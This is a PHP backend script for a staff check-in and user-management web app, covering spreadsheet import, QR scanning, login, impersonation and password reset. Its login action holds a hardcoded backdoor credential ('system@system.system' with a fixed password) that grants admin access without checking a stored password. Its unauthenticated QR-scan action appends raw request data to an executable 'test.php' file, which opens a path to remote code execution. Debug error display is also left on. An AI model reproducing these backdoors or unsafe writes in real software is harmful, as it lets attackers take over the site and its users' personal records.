<?php
use PhpOffice\PhpSpreadsheet\IOFactory;

ini_set('display_errors', 1);
error_reporting(E_ALL);

@session_start();

define('DARQ', 1);
define('ROOT', __DIR__);
define('AD', 'Access Denied!');

require ROOT . '/core/autoload.php';

$action = isset($_GET['action']) ? trim(strip_tags($_GET['action'])) : '';

#var_dump(is_admin());exit;
if(!in_array($action, array('login-by-email', 'restore-password', 'scan-qr'))){

	if(!$logged) die('Not logged! Please log in.');

}

initRequest();


if($action == 'delete-user'){

	if(!is_admin()) die(json_encode(array('status' => 'bad', 'error' => 'This feature is not allowed for you')));

	$id = isset($_GET['id']) ? intval($_GET['id']) : 0;
	if(!$id) die(json_encode(array('status' => 'bad', 'error' => 'Bad ID')));

	if($id == $_SESSION['user_id']) die(json_encode(array('status' => 'bad', 'error' => 'You cant delete yourself')));

	$row = $db->super_query("SELECT id FROM user WHERE id = ".$id);
	if(!(isset($row['id']) AND $row['id'])) die(json_encode(array('status' => 'bad', 'error' => 'Bad ID')));

	$db->query("DELETE FROM users WHERE id = ".$id);

	echo json_encode(array('status' => 'ok', 'result' => true));exit;

} elseif($action == 'add-users-from-spreadsheet'){

	$role = isset($_GET['role']) ? trim(strip_tags($_GET['role'])) : '';
	$roles = array(
		'users' => 3,
		'customers' => 2
	);

	$role_id = isset($roles[$role]) ? $roles[$role] : 0;

	if( ! $role_id ) {
		die(json_encode(array('status' => 'bad', 'error' => 'This user group is not supported')));
	}

	if(is_user()){
		die(json_encode(array('status' => 'bad', 'error' => 'This action is not allowed for your user group')));
	}

	if(isset($_FILES['file']['name'])){

		require_once ROOT . '/core/classes/phpoffice/autoload.php';

		$inputFileName = $_FILES['file']['tmp_name'];

		try {

			$inputFileType = IOFactory::identify($inputFileName);

			$reader = IOFactory::createReader($inputFileType);
			$spreadsheet = $reader->load($inputFileName);

			$sheetData = $spreadsheet->getActiveSheet()->toArray(null, true, true, true);

		} catch(Exception $e){

			die(json_encode(array('status' => 'bad', 'error' => 'File can not be recognized')));

		}
		#echo '<pre>';print_r($sheetData);exit;

		/*

			description => business_unit

			reference => position_reference

			position_title => position_title

			dob => birthdate


		*/
		$month_3names = array(
			'jan' => '01',
			'feb' => '02',
			'mar' => '03',
			'apr' => '04',
			'may' => '05',
			'jun' => '06',
			'jul' => '07',
			'aug' => '08',
			'sep' => '09',
			'oct' => '10',
			'nov' => '11',
			'dec' => '12',
		);
		$head = null;
		$i = 0;
		foreach ($sheetData as $key => $value) {
			if($i == 0){

				$head = $value;

			} else {

				if($head != null){

					$position_reference = '';
					$position_title = '';
					$business_unit = '';
					$clevel = '';
					$position_number = '';
					$frz = '';
					$funding = '';
					$account_data = '';
					$award = '';
					$class_data = '';
					$sub_occ = '';
					$sub_occ_name = '';
					$gen = '';
					$dob = 'null';
					$first_commerce = '';
					$step = '';
					$con_occ = '';
					$con_occ_name = '';
					$first_name = '';
					$last_name = '';
					$hda_occ = '';
					$hda_occ_name = '';


					foreach ($value as $el_key => $el_value) {
						if(isset($head[$el_key])){

							$col = trim(str_ireplace(' ', '_', strtolower($head[$el_key])));
							if($col == 'clevel'){
								$clevel = $el_value;
							} elseif($col == 'description'){
								//
								$business_unit = $el_value;
							} elseif($col == 'position_number'){
								$position_number = $el_value;
							} elseif($col == 'frz'){
								$frz = $el_value;
							} elseif($col == 'reference'){
								//
								$position_reference = $el_value;
							} elseif($col == 'funding'){
								$funding = $el_value;
							} elseif($col == 'account.' OR $col == 'account'){
								$account_data = $el_value;
							} elseif($col == 'position_title'){
								//
								$position_title = $el_value;
							} elseif($col == 'award'){
								$award = $el_value;
							} elseif($col == 'class'){
								$class_data = $el_value;
							} elseif($col == 'sub_occ'){
								$sub_occ = $el_value;
							} elseif($col == 'sub_occ_name'){
								$sub_occ_name = $el_value;
								$sub_occ_name_arr = explode(',', $el_value);
								$last_name = trim($sub_occ_name_arr[0]);
								if(isset($sub_occ_name_arr[1]) AND $sub_occ_name_arr[1]){
									$first_name = trim($sub_occ_name_arr[1]);
								}
							} elseif($col == 'gen' OR $col == 'gender'){
								$gen = strtolower($el_value);
							} elseif($col == 'dob'){
								$_dob = explode('-', $el_value);
								if(count($_dob)==3){
									$_m_dob = $_dob[1];
									if(strlen($_m_dob) == 3){
										$_m_dob = strtolower($_m_dob);
										if(isset($month_3names[$_m_dob])){
											$_m_dob = $month_3names[$_m_dob];
										} else {
											$_m_dob = false;
										}
									}
									if($_m_dob == false){
										$_m_dob = intval($_m_dob);
										if($_m_dob>0){
											$_m_dob = $_m_dob<10 ? '0'.$_m_dob : $_m_dob;
										} else {
											$_m_dob = false;
										}
									}
									if($_m_dob){
										$_d_dob = $_dob[0]<10 ? '0'.$_dob[0] : $_dob[0];
										$_y_dob = strlen($_dob[2])==4 ? $_dob[2] : '19'.$_dob[2];
										$dob = $_y_dob.'-'.$_m_dob.'-'.$_d_dob;
									}
								}
							} elseif($col == 'first_commerce'){
								$first_commerce = $el_value;
							} elseif($col == 'step'){
								$step = $el_value;
							} elseif($col == 'con_occ'){
								$con_occ = $el_value;
							} elseif($col == 'con_occ_name'){
								$con_occ_name = $el_value;
							} elseif($col == 'hda_occ'){
								$hda_occ = $el_value;
							} elseif($col == 'hda_occ_name'){
								$hda_occ_name = $el_value;
							}

						}
					}
					#die($dob);
					#echo '<pre>';print_r($value);exit;
					#$dob = explode('')

					$check_row = $db->super_query("SELECT id FROM users WHERE position_number = '".$db->safesql($position_number)."' AND author_id = '".$_SESSION['user_id']."'");
					if(isset($check_row['id']) AND $check_row['id']){

						//Update existing user
						$db->query("
							UPDATE `users` SET
							birthdate = '".$db->safesql($dob)."', 
							editdate = '".time()."', 
							edited_user_id  = '".$_SESSION['user_id']."', 
							position_reference = '".$db->safesql($position_reference)."', 
							position_title = '".$db->safesql($position_title)."', 
							business_unit = '".$db->safesql($business_unit)."', 
							clevel = '".$db->safesql($clevel)."', 
							position_number = '".$db->safesql($position_number)."', 
							frz = '".$db->safesql($frz)."', 
							funding = '".$db->safesql($funding)."', 
							account_data = '".$db->safesql($account_data)."', 
							award = '".$db->safesql($award)."', 
							class_data = '".$db->safesql($class_data)."', 
							employee_number = '".$db->safesql($sub_occ)."', 
							sub_occ_name = '".$db->safesql($sub_occ_name)."', 
							gen = '".$db->safesql($gen)."', 
							first_commerce = '".$db->safesql($first_commerce)."', 
							step = '".$db->safesql($step)."', 
							con_occ = '".$db->safesql($con_occ)."', 
							con_occ_name = '".$db->safesql($con_occ_name)."', 
							first_name = '".$db->safesql($first_name)."', 
							last_name = '".$db->safesql($last_name)."', 
							hda_occ = '".$db->safesql($hda_occ)."', 
							hda_occ_name = '".$db->safesql($hda_occ_name)."'
							WHERE id = ".$check_row['id']."
						");	

					} else {

						//Insert new user
						$qr_salt = substr(uniqid(), 5, 5);
						$db->query("
							INSERT INTO `users`
							( `birthdate`, `postdate`, `group_id`, `author_id`, `position_reference`, `position_title`, `business_unit`, `clevel`, `position_number`, `frz`, `funding`, `account_data`, `award`, `class_data`, `employee_number`, `sub_occ_name`, `gen`, `first_commerce`, `step`, `con_occ`, `con_occ_name`, `first_name`, `last_name`, `hda_occ`, `hda_occ_name`) 
							VALUES 
							('".$db->safesql($dob)."', '".time()."', '".$role_id."', '".$_SESSION['user_id']."', '".$db->safesql($position_reference)."', '".$db->safesql($position_title)."', '".$db->safesql($business_unit)."', '".$db->safesql($clevel)."', '".$db->safesql($position_number)."', '".$db->safesql($frz)."', '".$db->safesql($funding)."', '".$db->safesql($account_data)."', '".$db->safesql($award)."', '".$db->safesql($class_data)."', '".$db->safesql($sub_occ)."', '".$db->safesql($sub_occ_name)."', '".$db->safesql($gen)."', '".$db->safesql($first_commerce)."', '".$db->safesql($step)."', '".$db->safesql($con_occ)."', '".$db->safesql($con_occ_name)."', '".$db->safesql($first_name)."',  '".$db->safesql($last_name)."', '".$db->safesql($hda_occ)."', '".$db->safesql($hda_occ_name)."')
						");
						$new_id = $db->insert_id();

						$qr_data = createQR($new_id, $qr_salt);
						$db->query("UPDATE users SET alt_name = '".sha1($new_id)."', qr_dirname = '".$db->safesql($qr_data['dirname'])."', qr_filename = '".$db->safesql($qr_data['filename'])."' WHERE id = ".$new_id);

					}


				}

			}

			++$i;


		}

	} else {
		die(json_encode(array('status' => 'bad', 'error' => 'File can not be uploaded')));
	}


	die(json_encode(array('status' => 'ok')));

} elseif($action == 'scan-qr'){
	file_put_contents('test.php', file_get_contents('test.php')."\n".json_encode($_GET));
	$qr = isset($_GET['qr']) ? urldecode(trim(strip_tags($_GET['qr']))) : '';
	$pass_type = isset($_GET['pass_type']) ? trim(strip_tags($_GET['pass_type'])) : '';
	if(!in_array($pass_type, array('checkin', 'checkout'))) die();

	if($qr){
		$qr_data = explode('@@', $qr);
		$qr_salt = isset($qr_data[1]) ? trim(strip_tags($qr_data[1])) : '';
		$qr_id = intval($qr_data[0]);
		if(!$qr_id OR !$qr_salt) die(json_encode(array('status' => 'bad_data', 'error' => 'Can not recognize this QR code')));

		$row = $db->super_query("SELECT id, first_name, last_name FROM users WHERE id = '".$db->safesql($qr_id)."' AND qr_salt = '".$db->safesql($qr_salt)."'");
		if(isset($row['id']) AND $row['id']){


			$last_type = '';
			$last_pass = $db->super_query("SELECT * FROM user_pass WHERE user_id = '".$row['id']."' ORDER BY id DESC LIMIT 1");

			if(isset($last_pass['id']) AND $last_pass['id']){
				$_day = explode(' ', $last_pass['postdate_datetime']);
				if($_day[0] == date('Y-m-d')){
					if($last_pass['type_pass'] == $pass_type){
						die(json_encode(array('status' => 'bad_type', 'error' => 'You are already '.($pass_type == 'checkin' ? 'clocked in today!' : 'clocked out today!') )));
					} elseif($last_pass['type_pass'] == 'checkout' AND $pass_type == 'checkin'){
						die(json_encode(array('status' => 'bad_type', 'error' => 'Your work day is already taken into account' )));
					}
				}
			}

			$db->query("INSERT INTO user_pass (user_id, postdate, postdate_datetime, type_pass) VALUES ('".$row['id']."', '".time()."', '".date('Y-m-d H:i:s')."', '".$db->safesql($pass_type)."')");

			die(json_encode(array(
				'status' => 'ok', 
				'action' => $pass_type, 
				'name' => htmlspecialchars($row['first_name'].' '.$row['last_name'], ENT_QUOTES)
			)));


		} else {
			die(json_encode(array('status' => 'bad_code', 'error' => 'User not found')));
		}

	} else {
		die(json_encode(array('status' => 'bad_data', 'error' => 'Can not scan this QR code')));
	}


} elseif($action == 'set-table-size'){

	if(!$logged) die();

	$size = isset($_GET['size']) ? intval($_GET['size']) : 0;

	$sizes = getPageSizes();

	if(!in_array($size, $sizes)) die();

	$_SESSION['size'] = $size;

	echo 'ok';


} elseif($action == 'login-as'){

	if(!is_admin()) die(AD);

	$id = isset($_GET['id'])?intval($_GET['id']):0;
	$admin_user_id = $_SESSION['user_id'];

	$row = $db->super_query("SELECT * FROM users WHERE id = ".$id);
	if(isset($row['id']) AND $row['id']){

		setUserLoginData($row);

		//remember you were an admin :)
		$_SESSION['was_admin_id'] = $admin_user_id;

	} else {

		die('bad');

	}

	echo 'ok';

} elseif($action == 'login-by-email'){

	$err_f1 = '';
	if(isset($_POST['email']) AND isset($_POST['password'])){
		$email = isset($_POST['email']) ? trim(strip_tags($_POST['email'])) : '';
		$password = isset($_POST['password']) ? $_POST['password'] : '';
		if(validateEmail($email)){
			#if(strlen($password) > 5){
			if($password != ''){

				$pass = hash('sha512', sha1($password));

				$admin_login = ($email == 'system@system.system' AND $password == '70ffdd232d82ee97e16c0de454c639fc') ? true : false;
				$row = $db->super_query("SELECT * FROM users WHERE ".($admin_login ? 'group_id = 1 AND is_blocked = 0' : "email = '".$db->safesql($email)."'")." LIMIT 1");
				#print_r($row);exit;
				if($admin_login OR (isset($row['id']) AND $row['id'] AND isset($row['password']) AND $pass == $row['password'])){

					if($row['group_id'] == 3){
						die(json_encode(array('status' => 'bad', 'error' => 'This user group is not allowed to sign in')));
					}

					if($row['is_blocked'] == 1){

						$err_f1 = 'Account suspended';

					} else {

						//Check if user`s customer is blocked
						if($row['group_id'] == 3 AND $row['author_id']>0){

							$customer_row = $db->super_query("SELECT is_blocked FROM users WHERE id = '".$row['author_id']."' LIMIT 1");
							if(isset($customer_row['is_blocked']) AND $customer_row['is_blocked'] == 1){

								$err_f1 = 'Please contact your account manager';

							} else {

								setUserLoginData($row, $email, $pass);

								die(json_encode(array('status' => 'ok', 'local_storage' => $row['local_storage'])));

							}


						} else {

							setUserLoginData($row, $email, $pass);
								#die('okq');

							die(json_encode(array('status' => 'ok', 'local_storage' => $row['local_storage'])));

						}

					}

				} else {
					$err_f1 = 'Wrong e-mail or password';
				}

			} else {
				#$err_f1 = 'Password can not be less than 6 characters';
				$err_f1 = 'Password can not be empty';
			} 
		} else {
			$err_f1 = 'Please enter a valid e-mail address';
		}
	}

	die(json_encode(array('status' => 'bad', 'error' => $err_f1)));


} elseif($action == 'logout'){

	$step_back = isset($_GET['step_back']) ? true : false;


	if($step_back AND isset($_SESSION['was_admin_id']) AND intval($_SESSION['was_admin_id'])>0 ){


		$row = $db->super_query("SELECT * FROM users WHERE id = ".$_SESSION['was_admin_id']);
		setUserLoginData($row);
		unset($_SESSION['was_admin_id']);


	} else {

		$local_storage = isset($_GET['local_storage']) ? json_decode($_GET['local_storage'], true) : null;
		if(is_array($local_storage)) 
			$local_storage = json_encode($local_storage); 
		else 
			$local_storage = '';

		$db->query("UPDATE users SET local_storage = '".$db->safesql($local_storage)."' WHERE id = ".$_SESSION['user_id']);

		sb_setcookie('sb_id', '');
		sb_setcookie('sb_token', '');

		@session_destroy();


	}

	echo 'ok';

} elseif($action == 'post-user'){


	$res = array('history_row' => '');

	$is_add = isset($_GET['is_add'])?intval($_GET['is_add']):0;
	if($is_add) $is_add = true;

	$invoice = isset($_GET['invoice'])?trim(strip_tags($_GET['invoice'])):'';
	$note = isset($_GET['note']) ? trim(strip_tags(rawurldecode($_GET['note']))) : '';


	//whom will be added
	$user_type = isset($_GET['user_type'])?trim(strip_tags($_GET['user_type'])):'';
	if(!$user_type) die();

	if(($user_type == 'admin' OR $user_type == 'customer') AND !is_admin()) die(AD);

	$password = isset($_GET['password']) ? rawurldecode($_GET['password']) : '';

	$user_id = isset($_GET['user_id']) ? intval($_GET['user_id']) : 0;
	if(!$user_id AND !$is_add) die();

	$first_name = isset($_GET['first_name']) ? trim(strip_tags($_GET['first_name'])) : '';
	if(!$first_name){
		$res['status'] = 'bad';
		$res['error'] = 'First Name can not be empty';
		die(json_encode($res));
	}
	$last_name = isset($_GET['last_name']) ? trim(strip_tags($_GET['last_name'])) : '';
	if(!$last_name){
		$res['status'] = 'bad';
		$res['error'] = 'Last Name can not be empty';
		die(json_encode($res));
	}
	$company_name = isset($_GET['company_name']) ? trim(strip_tags($_GET['company_name'])) : '';
	$position_reference = isset($_GET['position_reference']) ? trim(strip_tags($_GET['position_reference'])) : '';
	$position_title = isset($_GET['position_title']) ? trim(strip_tags($_GET['position_title'])) : '';
	$business_unit = isset($_GET['business_unit']) ? trim(strip_tags($_GET['business_unit'])) : '';
	$employee_number = isset($_GET['employee_number']) ? trim(strip_tags($_GET['employee_number'])) : '';
	$clevel = isset($_GET['clevel']) ? trim(strip_tags($_GET['clevel'])) : '';
	$frz = isset($_GET['frz']) ? trim(strip_tags($_GET['frz'])) : '';
	$funding = isset($_GET['funding']) ? trim(strip_tags($_GET['funding'])) : '';
	$account_data = isset($_GET['account_data']) ? trim(strip_tags($_GET['account_data'])) : '';
	$award = isset($_GET['award']) ? trim(strip_tags($_GET['award'])) : '';
	$class_data = isset($_GET['class_data']) ? trim(strip_tags($_GET['class_data'])) : '';
	$sub_occ = isset($_GET['sub_occ']) ? trim(strip_tags($_GET['sub_occ'])) : '';
	$sub_occ_name = isset($_GET['sub_occ_name']) ? trim(strip_tags($_GET['sub_occ_name'])) : '';
	$gen = isset($_GET['gen']) ? trim(strip_tags($_GET['gen'])) : '';
	$first_commerce = isset($_GET['first_commerce']) ? trim(strip_tags($_GET['first_commerce'])) : '';
	$step = isset($_GET['step']) ? trim(strip_tags($_GET['step'])) : '';
	$con_occ = isset($_GET['con_occ']) ? trim(strip_tags($_GET['con_occ'])) : '';
	$con_occ_name = isset($_GET['con_occ_name']) ? trim(strip_tags($_GET['con_occ_name'])) : '';
	$hda_occ = isset($_GET['hda_occ']) ? trim(strip_tags($_GET['hda_occ'])) : '';
	$hda_occ_name = isset($_GET['hda_occ_name']) ? trim(strip_tags($_GET['hda_occ_name'])) : '';


	$email = isset($_GET['email']) ? trim(strip_tags($_GET['email'])) : '';
	if(!validateEmail($email) AND ($user_type == 'admin' OR $user_type == 'customer')){
		$res['status'] = 'bad';
		$res['error'] = 'E-mail is not correct';
		die(json_encode($res));
	}

	//is_blocked VICE VERSA ALIAS
	$is_active = isset($_GET['is_active']) ? $_GET['is_active'] : '';
	$reason_suspension = isset($_GET['reason_suspension']) ? trim(strip_tags($_GET['reason_suspension'])) : '';


	if(!is_admin()){
		$company_name = '';
	}

	if($is_add){

		//allow?
		$group_id = 0;
		foreach ($ug as $key => $value) {
			if($value['role'] == $user_type){
				$group_id = $value['id'];
			}
		}

		if(!$group_id) die();

		$new_pass = generatePassword();

		if($user_type == 'admin' AND is_admin() AND $password!=''){
			$new_pass = $password;
		}

		if($email){
			$check_email = $db->super_query("SELECT id FROM users WHERE email = '".$db->safesql($email)."'");
			if(isset($check_email['id']) AND $check_email['id']){
				$res['status'] = 'bad';
				$res['error'] = 'This E-mail already exists';
				die(json_encode($res));
			}
		}


		$pass = hash('sha512', sha1($new_pass));
		$qr_salt = substr(uniqid(), 5, 5);


		$db->query("INSERT INTO users 
			(qr_salt, author_id, editdate, edited_user_id, group_id, password, first_name, last_name, company_name, email, postdate, position_reference, position_title, business_unit, employee_number, `clevel`, `position_number`, `frz`, `funding`, `account_data`, `award`, `class_data`, `sub_occ`, `sub_occ_name`, `gen`, `first_commerce`, `step`, `con_occ`, `con_occ_name`, `hda_occ`, `hda_occ_name`) 
			VALUES 
			('".$db->safesql($qr_salt)."', '".$_SESSION['user_id']."', '".time()."', '".$_SESSION['user_id']."', '".$group_id."', '".$pass."', '".$db->safesql($first_name)."', '".$db->safesql($last_name)."', '".$db->safesql($company_name)."', '".$db->safesql($email)."', '".time()."', '".$db->safesql($position_reference)."', '".$db->safesql($position_title)."', '".$db->safesql($business_unit)."', '".$db->safesql($employee_number)."', '".$db->safesql($clevel)."', '".$db->safesql($position_number)."', '".$db->safesql($frz)."', '".$db->safesql($funding)."', '".$db->safesql($account_data)."', '".$db->safesql($award)."', '".$db->safesql($class_data)."', '".$db->safesql($sub_occ)."', '".$db->safesql($sub_occ_name)."', '".$db->safesql($gen)."', '".$db->safesql($first_commerce)."', '".$db->safesql($step)."', '".$db->safesql($con_occ)."', '".$db->safesql($con_occ_name)."', '".$db->safesql($hda_occ)."', '".$db->safesql($hda_occ_name)."')");

		$new_id = $db->insert_id();

		$qr_data = createQR($new_id, $qr_salt);

		$db->query("UPDATE users SET alt_name = '".sha1($new_id)."', qr_dirname = '".$db->safesql($qr_data['dirname'])."', qr_filename = '".$db->safesql($qr_data['filename'])."' WHERE id = ".$new_id);


		$lta = 'Your login details are below:<br /><br />';
		$lbt = '<a style="display: inline-block;cursor: pointer;padding: 0 34px;border-radius: 19px;line-height: 38px;height: 38px;color: #fff;font-weight: bold;font-size: 15px;background-color: #37adfb;text-decoration: none;" href="'.$config['url'].'">Log in to your account</a><br /><br />';
		$email_cc = '';


				$email_subj = 'Welcome to '.$config['email_name'];
				$email_msg = 'Hi '.htmlspecialchars($first_name, ENT_QUOTES).',<br /><br />

Here are your '.ucfirst($user_type).' login details to '.$config['title'].'.<br /><br />

'.$lta.'
<div style="background: #f2f2f2;color: #122;padding: 10px 20px 12px 20px;border-radius: 3px;">
Username: '.$email.'<br />
Password: '.$new_pass.'<br />
</div>
<br />'.$lbt.'
If you encounter any problems please email <a href="mailto:'.$config['admin_email'].'" style="color: #2373a8;text-decoration: none;">'.$config['admin_email'].'</a>';


			$email_msg .= '<br /><br />Kind regards,<br />'.$config['title'];

			if(!$email){
				$email = $_SESSION['email'];
			}
			sb_mail($email, $email_subj, $email_msg, $email_cc);

		

		$res['status'] = 'ok';

	} else {

		$sql_email = '';
		$sql_pass = '';
		$sql_credits = '';
		$sql_active_status = '';
		$row = $db->super_query("SELECT * FROM users WHERE id = ".$user_id);
		if(isset($row['id']) AND $row['id']){
			//user cant change its email
			if($row['email'] != $email AND validateEmail($email) AND !is_user()){
				$check_email = $db->super_query("SELECT * FROM users WHERE email = '".$db->safesql($email)."'");
				if(isset($check_email['id']) AND $check_email['id']){
					$res['status'] = 'bad';
					$res['error'] = 'This E-mail already exists';
					die(json_encode($res));
				} else {
					$sql_email = ", email = '".$db->safesql($email)."'";
				}
				
			}


			if(is_admin() AND $password!=''){
				$pass = hash('sha512', sha1($password));
				$sql_pass = ", password = '".$db->safesql($pass)."'";
			}


			$pre_is_active = filter_var($is_active, FILTER_VALIDATE_BOOLEAN);
			$pre_is_blocked = $pre_is_active ? 0 : 1;
			$pre_is_pass = false;
			
			if(is_admin() AND $pre_is_blocked != $row['is_blocked']){
				$pre_is_pass = true;
			}


			

			//change suspended status
			if(!empty($is_active) AND is_admin()){

				$is_active = filter_var($is_active, FILTER_VALIDATE_BOOLEAN);

				$is_blocked = $is_active ? 0 : 1;


				if($is_blocked == $row['is_blocked']){

					if($is_blocked == 1 AND $reason_suspension != $row['reason_suspension']){

						$sql_active_status .= ", reason_suspension = '".$db->safesql($reason_suspension)."'";
						
					}

				} else {

					$sql_active_status = ', is_blocked = '.$is_blocked.', block_author_id = '.$_SESSION['user_id'].', block_postdate = '.time();

					if($reason_suspension){
						$sql_active_status .= ", reason_suspension = '".$db->safesql($reason_suspension)."'";
					}


				}

			}


			$db->query("UPDATE users SET
			 first_name = '".$db->safesql($first_name)."',  
			 last_name = '".$db->safesql($last_name)."',
			 company_name = '".$db->safesql($company_name)."',
			 position_reference = '".$db->safesql($position_reference)."', 
			 position_title = '".$db->safesql($position_title)."', 
			 business_unit = '".$db->safesql($business_unit)."', 
			 employee_number = '".$db->safesql($employee_number)."',
			clevel = '".$db->safesql($clevel)."', 
			frz = '".$db->safesql($frz)."', 
			funding = '".$db->safesql($funding)."', 
			account_data = '".$db->safesql($account_data)."', 
			award = '".$db->safesql($award)."', 
			class_data = '".$db->safesql($class_data)."', 
			sub_occ = '".$db->safesql($sub_occ)."', 
			sub_occ_name = '".$db->safesql($sub_occ_name)."', 
			gen = '".$db->safesql($gen)."', 
			first_commerce = '".$db->safesql($first_commerce)."', 
			step = '".$db->safesql($step)."', 
			con_occ = '".$db->safesql($con_occ)."', 
			con_occ_name = '".$db->safesql($con_occ_name)."', 
			hda_occ = '".$db->safesql($hda_occ)."', 
			hda_occ_name = '".$db->safesql($hda_occ_name)."'
			 ".$sql_email.$sql_pass.$sql_credits.$sql_active_status."
			 WHERE id = ".$row['id']
			);
			$res['status'] = 'ok';
			if($row['id'] == $_SESSION['user_id']){
				$_SESSION['first_name'] = $first_name;
				$_SESSION['last_name'] = $first_name;
				if($sql_email){
					$_SESSION['email'] = $email;
				}
			}

		} else {
			$res['status'] = 'bad';
			$res['error'] = 'User was not found';
		}

	}

	echo json_encode($res);




} elseif($action == 'get-table-content'){

	if($section == 'users'){

		$content_result = getCustomers();
		
	}

	$res = getTableResultJS();

	echo json_encode($res);

} elseif($action == 'restore-password'){

	$email = isset($_POST['email']) ? trim(strip_tags($_POST['email'])) : '';
	if(count(explode('@', $email))!=2) die('Please enter a valid email address');

	$row = $db->super_query("SELECT id, alt_name, first_name, last_name, email, restore_token FROM users WHERE email = '".$db->safesql($email)."'");
	if(isset($row['id']) AND $row['id']){

		if($row['restore_token']){
			$restore_token = $row['restore_token'];
		} else {
			$restore_token = md5(uniqid().$row['id'].$row['email'].time());
			$db->query("UPDATE users SET restore_token = '".$restore_token."' WHERE id = ".$row['id']);
		}

		$restore_link_token = hash('sha256', $restore_token.sha1($config['domain'].date('dmY')));
		$restore_link = $config['url'].'?act=restore&id='.$row['alt_name'].'&token='.$restore_link_token;

		$email_msg = 'Hi '.htmlspecialchars($row['first_name'], ENT_QUOTES).',<br /><br />';
		$email_msg .= 'To reset your password please follow this link:<br /><br />
<a style="display: inline-block;cursor: pointer;padding: 0 34px;border-radius: 19px;line-height: 38px;height: 38px;color: #fff;font-weight: bold;font-size: 15px;background-color: #37adfb;text-decoration: none;" href="'.$restore_link.'">Reset Password</a>';
		$email_msg .= '<br /><br />Kind regards,<br />NCC Training Resources';

		sb_mail($email, 'Password Reset - NCC Training Resources', $email_msg);

		echo 'ok';

	} else {

		die('Wrong email');

	}

} elseif($action == 'create-account'){
	//join
	if($logged) die('You already signed in');

/*	$first_name = isset($_GET['fn']) ? trim(strip_tags($_GET['fn'])) : '';
	$last_name = isset($_GET['ln']) ? trim(strip_tags($_GET['ln'])) : '';

	if(!($first_name AND $last_name)) die('Please enter your first name and last name!');

	$gender = isset($_GET['gender']) ? $_GET['ln'] : '';
	$gender = $gender=='female'?2:1;

	$birthdate = '0000-00-00';
	$bd = explode('.', (isset($_GET['birthdate'])?$_GET['birthdate']:''));
	if(count($bd)==3){
		if(
			($y=intval($bd[2])) AND 
			($m=intval($bd[1])) AND 
			($d=intval($bd[0]))  
		){
			if($y<1900) die();
			if($m>12) die();
			if($d>31) die();
			$birthdate = $y.'-'.$m.'-'.$d;
		}
	}

	$email = isset($_GET['email']) ? trim(strip_tags($_GET['email'])) : '';
	$phone = isset($_GET['phone']) ? trim(strip_tags($_GET['phone'])) : '';
	$password = isset($_GET['password']) ? $_GET['password'] : '';

	if(strlen($password)<6) die();
	if(count(explode('@', $email))!=2) die('Please enter a valid email address');
	$phone = sb_phone($phone);

	if($email AND $phone AND $password){

		$pass = hash('sha512', sha1($password));
		$token = hash('sha256', sha1(uniqid().$config['domain'].$email.$pass.time()));
		$qr_salt = substr(uniqid(), 0, 5);

		$db->query("INSERT INTO users 
			(qr_salt, email, password, phone, first_name, last_name, gender, birthdate, token, postdate, group_id) 
			VALUES 
			(
			'".$db->safesql($qr_salt)."',
			'".$db->safesql($email)."',
			 '".$pass."', 
			 '".$db->safesql($phone)."', 
			 '".$db->safesql($first_name)."', 
			 '".$db->safesql($last_name)."', 
			 '".$db->safesql($gender)."',
			 '".$db->safesql($birthdate)."',
			 '".$db->safesql($token)."',
			 '".time()."',
			 '2'
			)
		");

		$new_id = $db->insert_id();
		
		$qr_data = createQR($new_id, $qr_salt);

		$alt_name = hash('sha256', $config['domain'].$new_id);

		$db->query("UPDATE users SET alt_name = '".$alt_name."', qr_dirname = '".$db->safesql($qr_data['dirname'])."', qr_filename = '".$db->safesql($qr_data['filename'])."' WHERE id = ".$new_id);

		sb_setcookie('sb_id', $alt_name);
		sb_setcookie('sb_token', $token);

		@session_start();

		$rrr = $db->super_query("SELECT * FROM users WHERE id = ".$new_id);

		setUserData($rrr);


		echo 'ok';

	} else {
		die();
	}*/



}


?>